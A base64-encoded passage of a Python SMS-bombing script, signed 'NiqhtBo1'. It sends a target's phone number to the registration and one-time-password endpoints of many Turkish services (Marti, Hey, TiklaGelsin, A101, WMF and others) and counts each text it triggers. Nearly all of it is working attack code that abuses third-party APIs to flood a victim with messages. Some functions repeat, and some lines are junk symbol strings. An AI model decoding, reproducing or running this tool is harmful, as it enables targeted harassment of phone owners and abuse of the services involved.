ZW50LWRpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9XCJmaXJzdF9uYW1lXCJcclxuXHJcbk1lbWF0aVxyXG4tLWZEbHdTemtaVTlEVzVNY3RJeE9pNEVJc1lCOUxLTVIxenliNWRPdWlKcGpwUW9LMVZQalN5cWR4SGZxUGRtM2lIYUtjemlcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwibGFzdF9uYW1lXCJcclxuXHJcbkJhc1xyXG4tLWZEbHdTemtaVTlEVzVNY3RJeE9pNEVJc1lCOUxLTVIxenliNWRPdWlKcGpwUW9LMVZQalN5cWR4SGZxUGRtM2lIYUtjemlcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiZW1haWxcIlxyXG5cclxue3NlbGYubWFpbH1cclxuLS1mRGx3U3prWlU5RFc1TWN0SXhPaTRFSXNZQjlMS01SMXp5YjVkT3VpSnBqcFFvSzFWUGpTeXFkeEhmcVBkbTNpSGFLY3ppXHJcbmNvbnRlbnQtZGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cImVtYWlsX2FsbG93ZWRcIlxyXG5cclxuZmFsc2VcclxuLS1mRGx3U3prWlU5RFc1TWN0SXhPaTRFSXNZQjlMS01SMXp5YjVkT3VpSnBqcFFvSzFWUGpTeXFkeEhmcVBkbTNpSGFLY3ppXHJcbmNvbnRlbnQtZGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cInNtc19hbGxvd2VkXCJcclxuXHJcbnRydWVcclxuLS1mRGx3U3prWlU5RFc1TWN0SXhPaTRFSXNZQjlMS01SMXp5YjVkT3VpSnBqcFFvSzFWUGpTeXFkeEhmcVBkbTNpSGFLY3ppXHJcbmNvbnRlbnQtZGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT1cInBhc3N3b3JkXCJcclxuXHJcbjMxQUJDLi5hYmMzMVxyXG4tLWZEbHdTemtaVTlEVzVNY3RJeE9pNEVJc1lCOUxLTVIxenliNWRPdWlKcGpwUW9LMVZQalN5cWR4SGZxUGRtM2lIYUtjemlcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwicGhvbmVcIlxyXG5cclxuMHtzZWxmLnBob25lfVxyXG4tLWZEbHdTemtaVTlEVzVNY3RJeE9pNEVJc1lCOUxLTVIxenliNWRPdWlKcGpwUW9LMVZQalN5cWR4SGZxUGRtM2lIYUtjemlcclxuY29udGVudC1kaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiY29uZmlybVwiXHJcblxyXG50cnVlXHJcbi0tZkRsd1N6a1pVOURXNU1jdEl4T2k0RUlzWUI5TEtNUjF6eWI1ZE91aUpwanBRb0sxVlBqU3lxZHhIZnFQZG0zaUhhS2N6aS0tXHJcbiIKICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDI6CiAgICAgICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUR1JFRU5fRVh9TWFkZSBCeSBOaXFodEJvMSB8IFsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGV2aWRlYS5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRSRURfRVh9TWFkZSBCeSBOaXFodEJvMSB8IFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBldmlkZWEuY29tIikKCiAgICAgICAgICAgICMgbWFydGkudGVjaAoKICAgIGRlZiBNYXJ0aShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2N1c3RvbWVyLm1hcnRpc2Nvb3Rlci5jb206NDQzL3YxMy9zY29vdGVyL2Rpc3BhdGNoL2N1c3RvbWVyL3NpZ25pbiIKICAgICAgICAgICAganNvbiA9IHsibW9iaWxlUGhvbmUiOiBzZWxmLnBob25lLCAibW9iaWxlUGhvbmVDb3VudHJ5Q29kZSI6ICI5MCIsICJvbmVTaWduYWxJZCI6ICIifQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbImlzU3VjY2VzcyJdID09IFRydWU6CiAgICAgICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUR1JFRU5fRVh9TWFkZSBCeSBOaXFodEJvMSB8IFsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGN1c3RvbWVyLm1hcnRpc2Nvb3Rlci5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRSRURfRVh9TWFkZSBCeSBOaXFodEJvMSB8IFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBjdXN0b21lci5tYXJ0aXNjb290ZXIuY29tIikKCiAgICAgICAgIyBoZXlzY29vdGVyLmNvbS50cgoKICAgIGRlZiBIZXkoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSBmImh0dHBzOi8vaGV5YXBpLmhleW1vYmlsaXR5LnRlY2g6NDQzL1YxNC8vYXBpL1VzZXIvQWN0aXZhdGlvbkNvZGVSZXF1ZXN0P29yZ2FuaXphdGlvbklkPTlEQ0EzMTJFLTE4QzgtNERBRS1BRTY1LTAxRkVBRDU1ODczOSZwaG9uZW51bWJlcj17c2VsZi5waG9uZX0mcmVxdWVzdGlkPTE4YmNhNGU0LTJmNDUtNDFiMC1iMDU0LTNlZmQ1YjJjOWM1Ny0yMDIzMDczMCZ0ZXJyaXRvcnlJZD03MzgyMTFkNC1mZDlkLTQxNjgtODFhNi1iN2RiZjkxMTcwZTkiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkFjY2VwdCI6ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyoiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIkhFWSElMjBTY29vdGVyLzE0MyBDRk5ldHdvcmsvMTMzNS4wLjMuMiBEYXJ3aW4vMjEuNi4wIiwgIkFjY2VwdC1MYW5ndWFnZSI6ICJ0ciJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICBpZiByLmpzb24oKVsiSXNTdWNjZXNzIl0gPT0gVHJ1ZToKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gaGV5YXBpLmhleW1vYmlsaXR5LnRlY2giKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRSRURfRVh9TWFkZSBCeSBOaXFodEJvMSB8IFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBoZXlhcGkuaGV5bW9iaWxpdHkudGVjaCIpCgogICAgICAgICMgYmluZXEudGVjaAoKICAgIGRlZiBCaW5lcShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly9iaW5lcWFwaS5oZXltb2JpbGl0eS50ZWNoOjQ0My9WMy8vYXBpL1VzZXIvQWN0aXZhdGlvbkNvZGVSZXF1ZXN0P29yZ2FuaXphdGlvbklkPTlEQ0EzMTJFLTE4QzgtNERBRS1BRTY1LTAxRkVBRDU1ODczOSZwaG9uZW51bWJlcj17c2VsZi5waG9uZX0iCiAgICAgICAgICAgIGhlYWRlciA9IHsiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiSEVZISUyMFNjb290ZXIvMTI4IENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLCAiQWNjZXB0LUxhbmd1YWdlIjogInRyIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcikKICAgICAgICAgICAgaWYgci5qc29uKClbIklzU3VjY2VzcyJdID09IFRydWU6CiAgICAgICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUR1JFRU5fRVh9TWFkZSBCeSBOaXFodEJvMSB8IFsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGJpbmVxYXBpLmhleW1vYmlsaXR5LnRlY2giKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRSRURfRVh9TWFkZSBCeSBOaXFodEJvMSB8IFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBiaW5lcWFwaS5oZXltb2JpbGl0eS50ZWNoIikKCiAgICAgICAgIyB0aWtsYWdlbHNpbi5jb20KCiAgICBkZWYgVGlrbGFHZWxzaW4oc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9zdmMuYXBwcy50aWtsYWdlbHNpbi5jb206NDQzL3VzZXIvZ3JhcGhxbCIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAiWC1NZXJjaGFudC1UeXBlIjogIjAiLCAiQWNjZXB0IjogIiovKiIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFwcHZlcnNpb24iOiAiMi40LjEiLCAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwKICAgICAgICAgICAgICAgICAgICAgICAiWC1Oby1BdXRoIjogInRydWUiLCAiVXNlci1BZ2VudCI6ICJUaWtsYUdlbHNpbi84MDkgQ0ZOZXR3b3JrLzEzMzUuMC4zLjIgRGFyd2luLzIxLjYuMCIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtRGV2aWNlLVR5cGUiOiAiMiJ9CiAgICAgICAgICAgIGpzb24gPSB7Im9wZXJhdGlvbk5hbWUiOiAiR0VORVJBVEVfT1RQIiwKICAgICAgICAgICAgICAgICAgICAicXVlcnkiOiAibXV0YXRpb24gR0VORVJBVEVfT1RQKCRwaG9uZTogU3RyaW5nLCAkY2hhbGxlbmdlOiBTdHJpbmcsICRkZXZpY2VVbmlxdWVJZDogU3RyaW5nKSB7XG4gIGdlbmVyYXRlT3RwKHBob25lOiAkcGhvbmUsIGNoYWxsZW5nZTogJGNoYWxsZW5nZSwgZGV2aWNlVW5pcXVlSWQ6ICRkZXZpY2VVbmlxdWVJZClcbn1cbiIsCiAgICAgICAgICAgICAgICAgICAgInZhcmlhYmxlcyI6IHsiY2hhbGxlbmdlIjogIjNkNmY5ZmY5LTg2Y2UtNGJmMy04YmE5LTRhODVjYTk3NWU2OCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiZGV2aWNlVW5pcXVlSWQiOiAiNzIwOTMyRDUtNDdCRC00NkNELUE0QjgtMDg2RUM0OUY4MUFCIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJwaG9uZSI6IGYiKzkwe3NlbGYucGhvbmV9In19CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJkYXRhIl1bImdlbmVyYXRlT3RwIl0gPT0gVHJ1ZToKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gc3ZjLmFwcHMudGlrbGFnZWxzaW4uY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUUkVEX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gc3ZjLmFwcHMudGlrbGFnZWxzaW4uY29tIikKCiAgICAgICAgIyB0YXNpbWFjaW0uY29tCgogICAgZGVmIFRhc2ltYWNpbShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3NlcnZlci50YXNpbWFjaW0uY29tL3JlcXVlc3Rjb2RlIgogICAgICAgICAgICBqc29uID0geyJwaG9uZSI6IHNlbGYucGhvbmUsICJsYW5nIjogInRyIn0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsPXVybCwganNvbj1qc29uKQogICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gc2VydmVyLnRhc2ltYWNpbS5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRSRURfRVh9TWFkZSBCeSBOaXFodEJvMSB8IFstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBzZXJ2ZXIudGFzaW1hY2ltLmNvbSIpCgogICAgICAgICMgeXVmZmkuY28KCiAgICBkZWYgWXVmZmkoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9hcGkueXVmZmkuY28vYXBpL3BhcmVudC9sb2dpbi91c2VyIgogICAgICAgICAgICBqc29uID0geyJwaG9uZSI6IHNlbGYucGhvbmUsICJrdmtrIjogVHJ1ZX0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJzdWNjZXNzIl0gPT0gVHJ1ZToKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1NYWRlIEJ5IE5pcWh0Qm8xIHwgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLnl1ZmZpLmNvIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICBmIntGb3JlLkxJR0hUUkVEX0VYfU1hZGUgQnkgTmlxaHRCbzEgfCBbLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gYXBpLnl1ZmZpLmNvIikKICAgIGRlZiBhMTAxKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd21mID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly93d3cuYTEwMS5jb20udHIvbG9naW4vJnJlZ2lzdGVyPXRydWUiLCBkYXRhPXsKICAgICAgICAgICAgICAgICJwaG9uZSI6IHNlbGYucGhvbmUKICAgICAgICAgICAgfSkKICAgICAgICAgICAgaWYgd21mLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiB3d3cuYTEwMS5jb20udHIiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiB3d3cuYTEwMS5jb20udHIiKQoKICAgIGRlZiBrYWh2ZShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdtZiA9IHJlcXVlc3RzLnBvc3QoInd3dy5rYWh2ZWR1bnlhc2kuY29tL2theWl0LW9sIiwgZGF0YT17CiAgICAgICAgICAgICAgICAibW9iaWxlX251bWJlciI6IHNlbGYucGhvbmUsCiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGlmIHdtZi5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gd3d3LmthaHZlZHVueWFzaS5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiB3d3cua2FodmVkdW55YXNpLmNvbSIpCgogICAgIyB3bWYuY29tLnRyCgogICAgZGVmIFdtZihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdtZiA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vd3d3LndtZi5jb20udHIvdXNlcnMvcmVnaXN0ZXIvIiwgZGF0YT17CiAgICAgICAgICAgICAgICAiY29uZmlybSI6ICJ0cnVlIiwKICAgICAgICAgICAgICAgICJkYXRlX29mX2JpcnRoIjogIjE5NTYtMDMtMDEiLAogICAgICAgICAgICAgICAgImVtYWlsIjogc2VsZi5tYWlsLAogICAgICAgICAgICAgICAgImVtYWlsX2FsbG93ZWQiOiAidHJ1ZSIsCiAgICAgICAgICAgICAgICAiZmlyc3RfbmFtZSI6ICJNZW1hdGkiLAogICAgICAgICAgICAgICAgImdlbmRlciI6ICJtYWxlIiwKICAgICAgICAgICAgICAgICJsYXN0X25hbWUiOiAiQmFzIiwKICAgICAgICAgICAgICAgICJwYXNzd29yZCI6ICIzMUFCQy4uYWJjMzEiLAogICAgICAgICAgICAgICAgInBob25lIjogZiIwe3NlbGYucGhvbmV9IgogICAgICAgICAgICB9KQogICAgICAgICAgICBpZiB3bWYuc3RhdHVzX2NvZGUgPT0gMjAyOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfSAgWytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gd21mLmNvbS50ciIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9ICBbLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gd21mLmNvbS50ciIpCgogICAgIyB0aWtsYWdlbHNpbi5jb20KICAgIGRlZiBUaWtsYUdlbHNpbigKICAgICAgICAgICAgc2VsZik6ICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CoyMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICB0cnk6ICAjIyMjIyMkPsKjw6YkPsKjJD7Coz7CoyM+wqPCvT7CoyMkPsKjwr0+wqMjJD7CoyMjIyMjIyQ+wqPDpiQ+wqMkPsKjPsKjIz7Co8K9PsKjIyQ+wqPCvT7CoyMkPsKjCiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3N2Yy5hcHBzLnRpa2xhZ2Vsc2luLmNvbTo0NDMvdXNlci9ncmFwaHFsIgogICAgICAgICAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsICJYLU1lcmNoYW50LVR5cGUiOiAiMCIsICJBY2NlcHQiOiAiKi8qIiwKICAgICAgICAgICAgICAgICAgICAgICAiQXBwdmVyc2lvbiI6ICIyLjQuMSIsICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJYLU5vLUF1dGgiOiAidHJ1ZSIsICJVc2VyLUFnZW50IjogIlRpa2xhR2Vsc2luLzgwOSBDRk5ldHdvcmsvMTMzNS4wLjMuMiBEYXJ3aW4vMjEuNi4wIiwKICAgICAgICAgICAgICAgICAgICAgICAiWC1EZXZpY2UtVHlwZSI6ICIyIn0KICAgICAgICAgICAganNvbiA9IHsib3BlcmF0aW9uTmFtZSI6ICJHRU5FUkFURV9PVFAiLAogICAgICAgICAgICAgICAgICAgICJxdWVyeSI6ICJtdXRhdGlvbiBHRU5FUkFURV9PVFAoJHBob25lOiBTdHJpbmcsICRjaGFsbGVuZ2U6IFN0cmluZywgJGRldmljZVVuaXF1ZUlkOiBTdHJpbmcpIHtcbiAgZ2VuZXJhdGVPdHAocGhvbmU6ICRwaG9uZSwgY2hhbGxlbmdlOiAkY2hhbGxlbmdlLCBkZXZpY2VVbmlxdWVJZDogJGRldmljZVVuaXF1ZUlkKVxufVxuIiwKICAgICAgICAgICAgICAgICAgICAidmFyaWFibGVzIjogeyJjaGFsbGVuZ2UiOiAiM2Q2ZjlmZjktODZjZS00YmYzLThiYTktNGE4NWNhOTc1ZTY4IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkZXZpY2VVbmlxdWVJZCI6ICI3MjA5MzJENS00N0JELTQ2Q0QtQTRCOC0wODZFQzQ5RjgxQUIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBob25lIjogZiIrOTB7c2VsZi5waG9uZX0ifX0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbImRhdGEiXVsiZ2VuZXJhdGVPdHAiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHN2Yy5hcHBzLnRpa2xhZ2Vsc2luLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IHN2Yy5hcHBzLnRpa2xhZ2Vsc2luLmNvbSIpCgogICAgZGVmIEhleShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9IGYiaHR0cHM6Ly9oZXlhcGkuaGV5bW9iaWxpdHkudGVjaDo0NDMvVjE0Ly9hcGkvVXNlci9BY3RpdmF0aW9uQ29kZVJlcXVlc3Q/b3JnYW5pemF0aW9uSWQ9OURDQTMxMkUtMThDOC00REFFLUFFNjUtMDFGRUFENTU4NzM5JnBob25lbnVtYmVyPXtzZWxmLnBob25lfSZyZXF1ZXN0aWQ9MThiY2E0ZTQtMmY0NS00MWIwLWIwNTQtM2VmZDViMmM5YzU3LTIwMjMwNzMwJnRlcnJpdG9yeUlkPTczODIxMWQ0LWZkOWQtNDE2OC04MWE2LWI3ZGJmOTExNzBlOSIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiSEVZISUyMFNjb290ZXIvMTQzIENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLCAiQWNjZXB0LUxhbmd1YWdlIjogInRyIn0KICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKICAgICAgICAgICAgIyMjIyMjJD7Co8OmJD7CoyQ+wqM+wqMjPsKjwr0+wqMjJD7Co8K9PsKjIyQ+wqMKCiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICBpZiByLmpzb24oKVsiSXNTdWNjZXNzIl0gPT0gVHJ1ZToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBoZXlhcGkuaGV5bW9iaWxpdHkudGVjaCIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGhleWFwaS5oZXltb2JpbGl0eS50ZWNoIikKC